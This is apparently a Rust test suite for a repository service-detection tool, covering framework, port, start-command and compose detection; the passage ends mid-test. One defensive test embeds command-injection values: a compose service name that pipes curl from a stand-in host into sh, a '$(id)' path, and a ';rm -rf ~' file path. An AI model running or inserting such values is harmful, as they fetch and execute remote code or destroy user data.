use super::*;
use serde_json::json;

/// A fake checkout. `detect` behaves like the CLI: it only hands over the
/// contents of the files `wanted_files` asked for, in at most 3 rounds.
#[derive(Default)]
struct Repo {
    files: Vec<String>,
    disk: BTreeMap<String, String>,
}

fn repo() -> Repo {
    Repo::default()
}

impl Repo {
    fn file(mut self, path: &str) -> Self {
        self.files.push(path.to_string());
        self
    }

    fn text(mut self, path: &str, content: &str) -> Self {
        self.files.push(path.to_string());
        self.disk.insert(path.to_string(), content.to_string());
        self
    }

    fn read(&self) -> BTreeMap<String, String> {
        let mut contents = BTreeMap::new();
        for _ in 0..3 {
            let mut new = false;
            for path in wanted_files(&self.files, &contents) {
                if contents.contains_key(&path) {
                    continue;
                }
                if let Some(text) = self.disk.get(&path) {
                    contents.insert(path, text.clone());
                    new = true;
                }
            }
            if !new {
                break;
            }
        }
        contents
    }

    fn detect(&self) -> DetectionReport {
        detect_app(&DetectInput {
            files: self.files.clone(),
            contents: self.read(),
            repo_name: "demo".into(),
        })
    }
}

fn dev_pkg(deps: &str) -> String {
    format!(r#"{{"scripts":{{"dev":"run-it"}},"dependencies":{{{deps}}}}}"#)
}

fn only(report: &DetectionReport) -> &DetectedService {
    assert_eq!(report.services.len(), 1, "{:#?}", report.services);
    &report.services[0]
}

#[test]
fn node_frameworks_are_detected_from_dependencies() {
    let cases: [(&str, Framework, ServiceKind); 14] = [
        (r#""next":"16""#, Framework::Next, ServiceKind::Frontend),
        (r#""nuxt":"3""#, Framework::Nuxt, ServiceKind::Frontend),
        (
            r#""@remix-run/node":"2""#,
            Framework::Remix,
            ServiceKind::Frontend,
        ),
        (
            r#""@react-router/dev":"7""#,
            Framework::Remix,
            ServiceKind::Frontend,
        ),
        (
            r#""@sveltejs/kit":"2","vite":"5""#,
            Framework::Sveltekit,
            ServiceKind::Frontend,
        ),
        (r#""astro":"4""#, Framework::Astro, ServiceKind::Frontend),
        (
            r#""@nestjs/core":"10","express":"4""#,
            Framework::Nestjs,
            ServiceKind::Backend,
        ),
        (
            r#""elysia":"latest""#,
            Framework::Elysia,
            ServiceKind::Backend,
        ),
        (r#""hono":"4""#, Framework::Hono, ServiceKind::Backend),
        (r#""fastify":"4""#, Framework::Fastify, ServiceKind::Backend),
        (r#""express":"4""#, Framework::Express, ServiceKind::Backend),
        (r#""vite":"5""#, Framework::Vite, ServiceKind::Frontend),
        (r#""react":"19""#, Framework::Unknown, ServiceKind::Unknown),
        (
            r#""next":"16","hono":"4""#,
            Framework::Next,
            ServiceKind::Frontend,
        ),
    ];
    for (deps, framework, kind) in cases {
        let report = repo().text("web/package.json", &dev_pkg(deps)).detect();
        let service = only(&report);
        assert_eq!(
            (service.framework.value, service.kind),
            (framework, kind),
            "{deps}"
        );
    }
    let report = repo()
        .text(
            "web/package.json",
            r#"{"scripts":{"dev":"x"},"devDependencies":{"vite":"5"}}"#,
        )
        .detect();
    assert_eq!(
        only(&report).framework.evidence,
        vec!["web/package.json devDependencies.vite"]
    );
}

#[test]
fn a_next_config_alone_selects_next() {
    let report = repo()
        .text("web/package.json", r#"{"scripts":{"dev":"x"}}"#)
        .file("web/next.config.mjs")
        .detect();
    let service = only(&report);
    assert_eq!(service.framework.value, Framework::Next);
    assert_eq!(service.framework.evidence, vec!["web/next.config.mjs"]);
}

#[test]
fn non_node_frameworks_are_detected_from_their_manifests() {
    let laravel = repo()
        .file("billing/artisan")
        .text(
            "billing/composer.json",
            r#"{"require":{"php":"^8.2","laravel/framework":"^12.0"}}"#,
        )
        .text(
            "billing/package.json",
            r#"{"scripts":{"dev":"vite"},"devDependencies":{"vite":"5"}}"#,
        )
        .detect();
    let service = only(&laravel);
    assert_eq!(service.framework.value, Framework::Laravel);
    assert_eq!(
        service.framework.evidence,
        vec![
            "billing/artisan",
            "billing/composer.json require.laravel/framework"
        ]
    );
    assert_eq!(service.package_manager, None);

    let cases: Vec<(Repo, Framework)> = vec![
        (
            repo().text(
                "s/composer.json",
                r#"{"require":{"symfony/framework-bundle":"7"}}"#,
            ),
            Framework::Symfony,
        ),
        (
            repo()
                .file("s/manage.py")
                .text("s/requirements.txt", "Django==5\n"),
            Framework::Django,
        ),
        (
            repo().text("s/requirements.txt", "fastapi==0.110\nuvicorn\n"),
            Framework::Fastapi,
        ),
        (
            repo().text(
                "s/pyproject.toml",
                "[project]\ndependencies = [\"flask>=3\"]\n",
            ),
            Framework::Flask,
        ),
        (
            repo().text("s/Gemfile", "source 'x'\ngem 'rails', '~> 7'\n"),
            Framework::Rails,
        ),
        (
            repo().text(
                "s/Api.csproj",
                "<Project Sdk=\"Microsoft.NET.Sdk.Web\">\n</Project>\n",
            ),
            Framework::Dotnet,
        ),
        (repo().text("s/go.mod", "module x\n"), Framework::Go),
        (
            repo().text(
                "s/Cargo.toml",
                "[package]\nname = \"x\"\n[dependencies]\naxum = \"0.7\"\n",
            ),
            Framework::Rust,
        ),
    ];
    for (repo, framework) in cases {
        let report = repo.detect();
        let service = only(&report);
        assert_eq!(service.framework.value, framework);
        assert_eq!(service.kind, ServiceKind::Backend);
    }
}

#[test]
fn package_managers_follow_lockfiles_with_bun_first() {
    let pm = |lockfiles: &[&str]| {
        let mut r = repo().text("web/package.json", &dev_pkg(r#""next":"1""#));
        for lock in lockfiles {
            r = r.file(lock);
        }
        let report = r.detect();
        let service = only(&report);
        (
            service.start.value.clone(),
            service.package_manager.clone().expect("node root"),
        )
    };
    let (start, guess) = pm(&["web/bun.lock"]);
    assert_eq!(start, "bun run dev");
    assert_eq!(
        (guess.value, guess.confidence),
        (PackageManager::Bun, Confidence::High)
    );
    assert_eq!(guess.evidence, vec!["web/bun.lock"]);
    assert_eq!(pm(&["web/pnpm-lock.yaml"]).0, "pnpm run dev");
    assert_eq!(pm(&["web/yarn.lock"]).0, "yarn run dev");
    assert_eq!(pm(&["web/package-lock.json"]).0, "npm run dev");
    assert_eq!(
        pm(&["pnpm-lock.yaml"]).0,
        "pnpm run dev",
        "lockfile of an ancestor"
    );

    let (start, guess) = pm(&["web/package-lock.json", "web/bun.lockb", "web/yarn.lock"]);
    assert_eq!(start, "bun run dev");
    assert_eq!(guess.confidence, Confidence::Medium);
    assert_eq!(
        guess.evidence,
        vec!["web: bun.lockb, yarn.lock and package-lock.json; using bun"]
    );
    let (start, guess) = pm(&[]);
    assert_eq!(start, "npm run dev");
    assert_eq!(
        (guess.value, guess.confidence),
        (PackageManager::Npm, Confidence::Low)
    );
}

#[test]
fn node_start_commands_prefer_dev_then_start_then_the_framework_cli() {
    let report = repo()
        .text(
            "api/package.json",
            r#"{"scripts":{"start":"node index.js"},"dependencies":{"express":"4"}}"#,
        )
        .detect();
    let service = only(&report);
    assert_eq!(service.start.value, "npm run start");
    assert_eq!(service.start.confidence, Confidence::High);
    assert_eq!(
        service.start.evidence,
        vec!["api/package.json scripts.start: node index.js"]
    );

    let report = repo()
        .text("web/package.json", r#"{"dependencies":{"next":"16"}}"#)
        .detect();
    let service = only(&report);
    assert_eq!(service.start.value, "npx next dev");
    assert_eq!(service.start.confidence, Confidence::Low);
    assert_eq!(service.confidence, Confidence::Low);

    let report = repo()
        .text("api/package.json", r#"{"dependencies":{"express":"4"}}"#)
        .detect();
    assert!(report.services.is_empty());
    assert_eq!(
        report.skipped,
        vec![SkippedRoot {
            root: "api".into(),
            reason: "no dev or start script".into()
        }]
    );
}

#[test]
fn framework_start_commands_embed_the_port() {
    let start = |r: Repo| only(&r.detect()).start.value.clone();
    assert_eq!(
        start(repo().file("b/artisan").text(
            "b/composer.json",
            r#"{"require":{"laravel/framework":"12"}}"#
        )),
        "php artisan serve --port 8000"
    );
    assert_eq!(
        start(repo().text(
            "b/composer.json",
            r#"{"require":{"symfony/framework-bundle":"7"}}"#
        )),
        "php -S 127.0.0.1:8000 -t public"
    );
    assert_eq!(
        start(
            repo()
                .file("b/manage.py")
                .text("b/requirements.txt", "django\n")
        ),
        "python manage.py runserver 8000"
    );
    assert_eq!(
        start(
            repo()
                .text("b/requirements.txt", "fastapi\n")
                .text("b/main.py", "app = FastAPI()\n")
        ),
        "uvicorn main:app --reload --port 8000"
    );
    assert_eq!(
        start(
            repo()
                .text("b/requirements.txt", "fastapi\n")
                .text("b/app/main.py", "app = FastAPI()\n")
        ),
        "uvicorn app.main:app --reload --port 8000"
    );
    assert_eq!(
        start(repo().text("b/requirements.txt", "flask\n")),
        "flask run --port 5000"
    );
    assert_eq!(
        start(repo().text("b/Gemfile", "gem \"rails\"\n")),
        "bin/rails server -p 3000"
    );
    assert_eq!(
        start(repo().text(
            "b/B.csproj",
            "<Project Sdk=\"Microsoft.NET.Sdk.Web\"></Project>"
        )),
        "dotnet run"
    );
    assert_eq!(
        start(repo().text("b/go.mod", "module b\n").file("b/main.go")),
        "go run ."
    );
    assert_eq!(
        start(
            repo()
                .text("b/go.mod", "module b\n")
                .file("b/cmd/api/main.go")
        ),
        "go run ./cmd/api"
    );
    assert_eq!(
        start(repo().text("b/Cargo.toml", "[dependencies]\nactix-web = \"4\"\n")),
        "cargo run"
    );
}

#[test]
fn ports_come_from_script_flags_first() {
    let report = repo()
        .text(
            "web/package.json",
            r#"{"scripts":{"dev":"next dev -p 3100"},"dependencies":{"next":"16"}}"#,
        )
        .text("web/.env.example", "PORT=4000\n")
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (3100, Confidence::High));
    assert_eq!(
        port.evidence,
        vec!["web/package.json scripts.dev: next dev -p 3100"]
    );

    let report = repo()
        .text(
            "web/package.json",
            r#"{"scripts":{"dev":"vite --port=5174"},"dependencies":{"vite":"5"}}"#,
        )
        .detect();
    assert_eq!(only(&report).port.value, 5174);
}

#[test]
fn ports_come_from_launch_settings() {
    let report = repo()
        .text("api/Api.csproj", "<Project Sdk=\"Microsoft.NET.Sdk.Web\"></Project>")
        .text(
            "api/Properties/launchSettings.json",
            r#"{"profiles":{"http":{"applicationUrl":"https://localhost:7001;http://localhost:5080"}}}"#,
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (5080, Confidence::High));
    assert_eq!(
        port.evidence,
        vec!["api/Properties/launchSettings.json applicationUrl http://localhost:5080"]
    );
}

#[test]
fn ports_come_from_literals_in_the_entry_file_and_its_imports() {
    let report = repo()
        .text(
            "api/package.json",
            r#"{"scripts":{"dev":"node --watch server.js"},"dependencies":{"express":"4"}}"#,
        )
        .text(
            "api/server.js",
            "const app = express();\n\napp.listen(4001, () => {});\n",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (4001, Confidence::High));
    assert_eq!(port.evidence, vec!["api/server.js:3 .listen(4001"]);

    let report = repo()
        .text(
            "api/package.json",
            r#"{"scripts":{"dev":"bun run --watch lib/boot.ts"},"dependencies":{"hono":"4"}}"#,
        )
        .text(
            "api/lib/boot.ts",
            "import { start } from './http/listen'\nstart()\n",
        )
        .text(
            "api/lib/http/listen.ts",
            "export const start = () => Bun.serve({\n  port: 7070,\n})\n",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!(port.value, 7070);
    assert_eq!(port.evidence, vec!["api/lib/http/listen.ts:2 port: 7070"]);

    let report = repo()
        .text("api/package.json", &dev_pkg(r#""elysia":"1""#))
        .text(
            "api/src/config/env.ts",
            "export const env = {\n  PORT: parseInt(process.env.PORT || '3001', 10),\n}\n",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!(port.value, 3001);
    assert_eq!(
        port.evidence,
        vec!["api/src/config/env.ts:2 PORT || '3001'"]
    );
}

#[test]
fn prefixed_port_variables_and_db_literals_are_not_the_service_port() {
    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text(
            "api/src/config/env.ts",
            "export const pageSize = z.number().default(20)
export const env = {
  DB_PORT: Number(process.env.DB_PORT || 5432),
  REDIS_PORT: process.env.REDIS_PORT ?? 6379,
  db: { host: 'localhost', port: 5432 },
  PORT: Number(process.env.PORT || 4000),
}
",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (4000, Confidence::High));
    assert_eq!(port.evidence, vec!["api/src/config/env.ts:6 PORT || 4000"]);
}

#[test]
fn a_bare_port_key_is_a_weaker_signal_than_a_listen_call() {
    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text(
            "api/src/index.ts",
            "const cache = { port: 8081 }
app.listen(4002)
",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (4002, Confidence::High));

    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text(
            "api/src/index.ts",
            "const db = { port: 5432 }
const server = { port: 4003 }
",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (4003, Confidence::Medium));
}

#[test]
fn ports_come_from_env_example_and_vite_config_then_defaults() {
    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text("api/.env.example", "# sample\nNODE_ENV=dev\nPORT=4000\n")
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (4000, Confidence::Medium));
    assert_eq!(port.evidence, vec!["api/.env.example:3 PORT=4000"]);

    let report = repo()
        .text("web/package.json", &dev_pkg(r#""vite":"5""#))
        .text(
            "web/vite.config.ts",
            "export default {\n  server: {\n    port: 5180,\n  },\n}\n",
        )
        .detect();
    let port = &only(&report).port;
    assert_eq!((port.value, port.confidence), (5180, Confidence::High));
    assert_eq!(port.evidence, vec!["web/vite.config.ts:3 port: 5180"]);

    let defaults: [(&str, u16, Confidence); 4] = [
        (r#""next":"1""#, 3000, Confidence::Medium),
        (r#""vite":"1""#, 5173, Confidence::Medium),
        (r#""astro":"1""#, 4321, Confidence::Medium),
        (r#""express":"1""#, 3000, Confidence::Low),
    ];
    for (deps, value, confidence) in defaults {
        let report = repo().text("x/package.json", &dev_pkg(deps)).detect();
        let port = &only(&report).port;
        assert_eq!((port.value, port.confidence), (value, confidence), "{deps}");
    }
    let report = repo()
        .text("x/package.json", &dev_pkg(r#""next":"1""#))
        .detect();
    assert_eq!(only(&report).port.evidence, vec!["next default port 3000"]);
}

#[test]
fn out_of_range_ports_are_ignored() {
    let report = repo()
        .text(
            "api/package.json",
            r#"{"scripts":{"dev":"node a.js --port 70000"},"dependencies":{"express":"4"}}"#,
        )
        .detect();
    assert_eq!(only(&report).port.value, 3000);
}

#[test]
fn only_the_env_example_dotenv_file_is_ever_requested() {
    let files: Vec<String> = [
        "api/package.json",
        "api/.env",
        "api/.env.local",
        "api/.env.production",
        "api/.env.example",
        ".env",
        ".env.example",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    let mut contents = BTreeMap::new();
    contents.insert("api/package.json".to_string(), dev_pkg(r#""express":"4""#));
    let wanted = wanted_files(&files, &contents);
    assert!(
        wanted.contains(&"api/.env.example".to_string()),
        "{wanted:?}"
    );
    assert!(
        wanted
            .iter()
            .all(|p| !p.rsplit('/').next().unwrap().starts_with(".env")
                || p.ends_with("/.env.example")
                || p == ".env.example"),
        "{wanted:?}"
    );
    assert!(!wanted.iter().any(|p| p.ends_with(".env")
        || p.ends_with(".env.local")
        || p.ends_with(".env.production")));
}

#[test]
fn two_services_on_one_port_both_drop_to_low() {
    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text("web/package.json", &dev_pkg(r#""next":"16""#))
        .detect();
    assert_eq!(report.services.len(), 2);
    assert!(
        report
            .services
            .iter()
            .all(|s| s.port.confidence == Confidence::Low)
    );
    assert!(
        report
            .notes
            .contains(&"port 3000 claimed by api and web".to_string()),
        "{:?}",
        report.notes
    );
}

#[test]
fn ready_paths_come_from_health_routes() {
    let report = repo()
        .text("api/package.json", &dev_pkg(r#""elysia":"1""#))
        .text(
            "api/src/app.ts",
            "export const app = new Elysia()\n  .get('/health', () => 'ok')\n",
        )
        .detect();
    let service = only(&report);
    assert_eq!(service.ready_path.value, "/health");
    assert_eq!(service.ready_path.confidence, Confidence::High);
    assert_eq!(
        service.ready_path.evidence,
        vec!["api/src/app.ts:2 .get('/health'"]
    );
    assert_eq!(service.ready_url, "http://localhost:3000/health");

    let report = repo()
        .text("api/go.mod", "module api\n")
        .text("api/main.go", "http.HandleFunc(\"/health\", h)\nhttp.HandleFunc(\"/healthz\", h)\nhttp.ListenAndServe(\":9090\", nil)\n")
        .detect();
    let service = only(&report);
    assert_eq!(service.ready_path.value, "/healthz");
    assert_eq!(service.port.value, 9090);

    let report = repo()
        .file("b/artisan")
        .text(
            "b/composer.json",
            r#"{"require":{"laravel/framework":"12"}}"#,
        )
        .text(
            "b/routes/api.php",
            "<?php\nRoute::get('/health', [HealthController::class, 'check']);\n",
        )
        .detect();
    let service = only(&report);
    assert_eq!(
        service.ready_path.value, "/api/health",
        "routes/api.php is mounted under /api"
    );
    assert_eq!(
        service.ready_path.evidence,
        vec!["b/routes/api.php:2 Route::get('/health'"]
    );

    let report = repo()
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .detect();
    let ready = &only(&report).ready_path;
    assert_eq!(
        (ready.value.as_str(), ready.confidence),
        ("/", Confidence::Low)
    );
    let report = repo()
        .text("web/package.json", &dev_pkg(r#""next":"16""#))
        .detect();
    let ready = &only(&report).ready_path;
    assert_eq!(
        (ready.value.as_str(), ready.confidence),
        ("/", Confidence::High)
    );
}

#[test]
fn ignored_directories_and_deep_manifests_are_not_service_roots() {
    let report = repo()
        .text("node_modules/x/package.json", &dev_pkg(r#""next":"1""#))
        .text("web/node_modules/y/package.json", &dev_pkg(r#""next":"1""#))
        .text("e2e-playwright/package.json", &dev_pkg(r#""next":"1""#))
        .text("web/src-tauri/Cargo.toml", "[dependencies]\naxum = \"1\"\n")
        .text(
            "vendor/a/composer.json",
            r#"{"require":{"laravel/framework":"1"}}"#,
        )
        .text("a/b/c/package.json", &dev_pkg(r#""next":"1""#))
        .detect();
    assert!(report.services.is_empty(), "{:#?}", report.services);
    assert!(report.skipped.is_empty(), "{:#?}", report.skipped);
}

#[test]
fn unsupported_and_tooling_roots_are_skipped_with_a_reason() {
    let report = repo()
        .file("tracker/build.gradle")
        .file("tracker/settings.gradle")
        .text(
            "tools/package.json",
            r#"{"devDependencies":{"prettier":"3"}}"#,
        )
        .text("lib/Cargo.toml", "[dependencies]\nserde = \"1\"\n")
        .detect();
    assert!(report.services.is_empty());
    assert_eq!(
        report.skipped,
        vec![
            SkippedRoot {
                root: "lib".into(),
                reason: "Cargo.toml without a web framework dependency".into()
            },
            SkippedRoot {
                root: "tools".into(),
                reason: "no dev or start script and no known framework".into()
            },
            SkippedRoot {
                root: "tracker".into(),
                reason: "no supported manifest (build.gradle)".into()
            },
        ]
    );
}

#[test]
fn services_are_named_after_their_directory_and_ordered_backends_first() {
    let report = repo()
        .text("a/Web App/package.json", &dev_pkg(r#""next":"1""#))
        .text("b/Web App/package.json", &dev_pkg(r#""vite":"1""#))
        .text("1api/package.json", &dev_pkg(r#""hono":"1""#))
        .text("tool/package.json", &dev_pkg(r#""react":"1""#))
        .detect();
    let names: Vec<(&str, &str)> = report
        .services
        .iter()
        .map(|s| (s.name.as_str(), s.root.as_str()))
        .collect();
    assert_eq!(
        names,
        vec![
            ("s-1api", "1api"),
            ("tool", "tool"),
            ("web-app", "a/Web App"),
            ("web-app-2", "b/Web App"),
        ]
    );
    assert_eq!(report.base_url.value, "http://localhost:3000");
    assert_eq!(
        report.base_url.evidence,
        vec!["first frontend service web-app"]
    );
}

#[test]
fn a_single_root_service_without_infra_is_the_single_shape() {
    let report = repo()
        .text("package.json", &dev_pkg(r#""next":"16""#))
        .detect();
    let service = only(&report);
    assert_eq!(
        (service.name.as_str(), service.root.as_str()),
        ("demo", ".")
    );
    assert_eq!(
        service.framework.evidence,
        vec!["package.json dependencies.next"]
    );
    assert_eq!(report.target_shape, TargetShape::Single);
    assert_eq!(report.compose, None);
    assert_eq!(report.ready_path.value, "/");
}

#[test]
fn nothing_detected_falls_back_to_the_previous_defaults() {
    let report = repo().file("README.md").detect();
    assert_eq!(report.base_url.value, "http://localhost:3000");
    assert_eq!(report.base_url.confidence, Confidence::Low);
    assert_eq!(report.ready_path.value, "/healthz");
    assert_eq!(report.target_shape, TargetShape::Single);
}

#[test]
fn a_compose_only_repo_runs_the_whole_stack_as_before() {
    let report = repo()
        .text("docker-compose.yml", "services:\n  app:\n    image: acme/app\n    ports:\n      - \"3000:3000\"\n  db:\n    image: postgres:16\n")
        .detect();
    let compose = report.compose.expect("compose");
    assert_eq!(compose.start.unwrap().value, "docker compose up -d --wait");
    assert_eq!(compose.stop.unwrap().value, "docker compose down -v");
    assert_eq!(report.target_shape, TargetShape::Single);
}

#[test]
fn compose_names_and_paths_never_reach_a_shell_command_unless_safe() {
    let compose = "services:\n  \"db; curl -s https://x.example/p | sh\":\n    image: postgres:16\n  cache:\n    image: valkey/valkey:8\n";
    let report = repo()
        .text("docker-compose.yml", compose)
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .detect();
    let c = report.compose.as_ref().expect("compose");
    assert_eq!(
        c.start.as_ref().unwrap().value,
        "docker compose -f docker-compose.yml up -d --wait cache"
    );
    assert!(
        c.services.iter().all(|s| s.name == "cache"),
        "{:?}",
        c.services
    );
    assert!(
        report
            .notes
            .iter()
            .any(|n| n.starts_with("docker-compose.yml service \"db; curl")
                && n.ends_with(": not a valid compose service name; ignored")),
        "{:?}",
        report.notes
    );

    let report = repo()
        .text(
            "$(id)/docker-compose.yml",
            "services:\n  db:\n    image: postgres:16\n",
        )
        .text("$(id)/package.json", &dev_pkg(r#""express":"4""#))
        .detect();
    assert!(report.compose.is_none(), "{:?}", report.compose);
    assert!(
        report.notes.contains(
            &"$(id)/docker-compose.yml: path has characters guard does not put in a shell command; ignored".to_string()
        ),
        "{:?}",
        report.notes
    );

    let report = repo()
        .text("b/go.mod", "module b\n")
        .file("b/cmd/x;rm -rf ~/main.go")
        .detect();
    assert_eq!(only(&report).start.value, "go run .");
}

#[test]
fn compose_infra_native_and_other_roles() {
    let compose = "services:\n  db:\n    image: postgres:16\n  cache:\n    image: valkey/valkey:8\n  gps:\n    image: traccar/traccar:latest\n    depends_on:\n      db:\n        condition: service_healthy\n  api:\n    build: ./api\n  worker:\n    build: ./api\n    command: npm run worker\n  proxy:\n    image: nginx:alpine\n    depends_on:\n      - api\n";
    let report = repo()
        .text("docker-compose.yml", compose)
        .text("api/package.json", &dev_pkg(r#""express":"4""#))
        .text(
            "api/docker-compose.deploy.yml",
            "services:\n  x:\n    image: postgres\n",
        )
        .text(
            "api/compose.yaml",
            "services:\n  q:\n    image: rabbitmq:3\n",
        )
        .detect();
    let c = report.compose.as_ref().expect("compose");
    assert_eq!(c.file, "docker-compose.yml");
    let roles: Vec<(&str, ComposeRole)> = c
        .services
        .iter()
        .map(|s| (s.name.as_str(), s.role))
        .collect();
    assert_eq!(
        roles,
        vec![
            ("db", ComposeRole::Infra),
            ("cache", ComposeRole::Infra),
            ("gps", ComposeRole::Infra),
            ("api", ComposeRole::Native),
            ("worker", ComposeRole::Native),
            ("proxy", ComposeRole::Other),
        ]
    );
    assert_eq!(c.services[3].build.as_deref(), Some("api"));
    let start = c.start.as_ref().unwrap();
    assert_eq!(
        start.value,
        "docker compose -f docker-compose.yml up -d --wait db cache gps"
    );
    assert_eq!(
        start.evidence,
        vec![
            "docker-compose.yml services db, cache, gps",
            "docker-compose.yml service gps depends only on infrastructure (db)",
        ]
    );
    assert_eq!(
        c.stop.as_ref().unwrap().value,
        "docker compose -f docker-compose.yml down"
    );
    let api = only(&report);
    assert_eq!(api.also_in_compose.as_deref(), Some("api"));
    assert_eq!(
        api.start.value, "npm run dev",
        "the native dev command stays"
    );
    assert!(
        api.start
            .evidence
            .contains(&"docker-compose.yml service api builds api".to_string())
    );
    assert_eq!(
        report.ignored_compose_files,
        vec![IgnoredComposeFile {
            file: "api/docker-compose.deploy.yml".into(),
            reason: "production compose file (deploy)".into()
        }]
    );
    assert_eq!(
        report.notes,
        vec![
            "compose service worker also builds api, which runs natively as api; it is not started (command: npm run worker): add a [[services]] entry if the app needs it",
            "compose service proxy (nginx:alpine) is not started by default",
            "api/compose.yaml has infrastructure but docker-compose.yml is used",
        ]
    );
    assert_eq!(report.target_shape, TargetShape::Services);
    let wanted = wanted_files(
        &repo()
            .text("api/package.json", "{}")
            .file("api/docker-compose.deploy.yml")
            .files,
        &BTreeMap::new(),
    );
    assert!(
        !wanted.contains(&"api/docker-compose.deploy.yml".to_string()),
        "{wanted:?}"
    );
}

/// The layout of an illustrative multi-service SaaS (one Elysia API on Bun, one Next.js
/// frontend with two lockfiles, one Laravel billing API, a Java GPS server and
/// a root compose file with the infrastructure), reduced to what detection reads.
fn acme_saas() -> Repo {
    let root_compose = r#"# local development
services:
  postgres:
    image: postgres:16-alpine
    restart: unless-stopped
    ports:
      - "5433:5432"
    environment:
      POSTGRES_DB: acme
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U acme -d acme"]
  redis:
    image: redis:7-alpine
    ports:
      - "6380:6379"
  traccar-db:
    image: timescale/timescaledb:latest-pg16
    environment:
      TIMESCALEDB_TELEMETRY: "off"
  traccar:
    image: traccar/traccar:latest
    depends_on:
      traccar-db:
        condition: service_healthy
    ports:
      - "8082:8082"    # Web UI + API
      - "5055:5055"    # OsmAnd
  laravel:
    build:
      context: ./acme-billing
      dockerfile: Dockerfile
      target: development
    environment:
      - APP_URL=http://localhost:8000
    depends_on:
      postgres:
        condition: service_healthy
  nginx:
    image: nginx:alpine
    ports:
      # 8000 is reserved by Hyper-V on Windows
      - "8500:80"
    depends_on:
      - laravel
  queue:
    build:
      context: ./acme-billing
    command: php artisan queue:work redis --sleep=3 --tries=3 --max-time=3600
  mailpit:
    image: axllent/mailpit
    ports:
      - "1125:1025"   # SMTP
      - "8525:8025"   # Web UI
volumes:
  postgres-data:
networks:
  acme-network:
    driver: bridge
"#;
    repo()
        .file(".env.example")
        .text("docker-compose.yml", root_compose)
        .file("AGENTS.md")
        .text(
            "acme-backend/package.json",
            r#"{"name":"acme-backend","scripts":{"test":"exit 1","dev":"bun run --watch src/index.ts"},"dependencies":{"@elysiajs/cors":"^1.4.0","elysia":"latest","ioredis":"^5.6.1"},"devDependencies":{"prisma":"^7.2.0"},"module":"src/index.js"}"#,
        )
        .file("acme-backend/bun.lock")
        .file("acme-backend/prisma/schema.prisma")
        .text(
            "acme-backend/src/index.ts",
            "import cluster from \"node:cluster\";\nif (process.env.NODE_ENV === \"development\") {\n    await import(\"./server\");\n} else {\n  await import(\"./server\");\n}\n",
        )
        .text(
            "acme-backend/src/server.ts",
            "import { app } from './app';\nimport { env } from './config/env';\n\nconst server = app.listen({\n    port: env.PORT,\n    hostname: env.HOST,\n});\n",
        )
        .text(
            "acme-backend/src/app.ts",
            "import { Elysia } from 'elysia';\nexport const app = new Elysia()\n    // base routes and health check\n    .get('/', () => 'Acme API')\n    .get('/health', () => ({ status: 'ok' }))\n",
        )
        .text(
            "acme-backend/src/config/env.ts",
            "export const env = {\n    NODE_ENV: process.env.NODE_ENV || 'development',\n    PORT: parseInt(process.env.PORT || '3001', 10),\n};\n",
        )
        .text(
            "acme-backend/docker-compose.yml",
            "services:\n  backend:\n    build: .\n    ports:\n      - \"3001:3001\"\n    environment:\n      - PORT=3001\n",
        )
        .text("acme-backend/docker-compose.dokploy.yml", "services:\n  backend:\n    build: .\n")
        .text(
            "acme-frontend/package.json",
            r#"{"name":"acme-frontend","private":true,"scripts":{"dev":"next dev","build":"next build --turbopack","start":"next start","tauri:dev":"tauri dev"},"dependencies":{"next":"16.0.10","react":"19.2.0"}}"#,
        )
        .file("acme-frontend/bun.lock")
        .file("acme-frontend/package-lock.json")
        .text("acme-frontend/next.config.ts", "const nextConfig = {};\nexport default nextConfig;\n")
        .text("acme-frontend/src-tauri/Cargo.toml", "[dependencies]\ntauri = \"2\"\n")
        .file("acme-frontend/src/app/page.tsx")
        .text("acme-frontend/docker-compose.dokploy.yml", "services:\n  frontend:\n    build: .\n")
        .file("acme-billing/artisan")
        .text(
            "acme-billing/composer.json",
            r#"{"name":"laravel/laravel","require":{"php":"^8.2","laravel/framework":"^12.0"}}"#,
        )
        .text(
            "acme-billing/package.json",
            r#"{"private":true,"type":"module","scripts":{"build":"vite build","dev":"vite"},"devDependencies":{"vite":"^6.0"}}"#,
        )
        .file("acme-billing/vite.config.js")
        .text("acme-billing/routes/web.php", "<?php\nRoute::get('/', fn () => view('welcome'));\n")
        .text(
            "acme-billing/routes/api.php",
            "<?php\n\nuse Illuminate\\Support\\Facades\\Route;\n\nRoute::get('/health', [App\\Http\\Controllers\\HealthController::class, 'check']);\n",
        )
        .text(
            "acme-billing/docker-compose.yml",
            "services:\n  app:\n    build:\n      context: .\n  nginx:\n    image: nginx:alpine\n    ports:\n      - \"${APP_PORT:-8000}:80\"\n  postgres:\n    image: postgres:16-alpine\n",
        )
        .text(
            "acme-billing/docker-compose.supabase.yml",
            "services:\n  studio:\n    image: supabase/studio:2025.04.21-sha-173cc56\n  db:\n    image: supabase/postgres:15.8.1.060\n",
        )
        .file("acme-billing/docker-compose.dokploy.yml")
        .file("acme-billing/docker-compose.dokploy-supabase.yml")
        .file("acme-billing/docker-compose.prod.yml")
        .file("acme-billing/supabase-compose.yml")
        .file("acme-tracker/build.gradle")
        .file("acme-tracker/settings.gradle")
        .file("acme-tracker/src/main/java/org/traccar/Main.java")
}

#[test]
fn wanted_files_for_the_acme_layout_follow_the_entry_imports() {
    let repo = acme_saas();
    let contents = repo.read();
    for path in [
        "acme-backend/src/index.ts",
        "acme-backend/src/server.ts",
        "acme-backend/src/app.ts",
        "acme-backend/src/config/env.ts",
        "acme-billing/routes/api.php",
        "docker-compose.yml",
    ] {
